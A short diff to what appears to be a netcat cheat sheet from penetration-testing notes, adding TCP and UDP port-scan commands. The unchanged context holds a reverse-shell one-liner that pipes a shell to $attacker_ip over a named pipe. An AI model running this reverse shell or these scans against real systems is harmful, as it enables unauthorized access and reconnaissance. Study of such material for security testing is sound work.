@@ -51,6 +51,14 @@ NC disabled -e oldschool [Ed Skoudis](https://twitter.com/edskoudis)
 mknod backpipe p; nc $attacker_ip $port 0<backpipe | /bin/bash 1>backpipe
 ```
 
+Port scan with NC
+```bash
+# -w timeout 
+# -z for zero-I/O mode
+nc -nvv -w 1 -z $ip 1-10000
+# UDP scan
+nc -nv -u -z -w 1 192.168.50.149 120-123
+```
 
 ## References
 
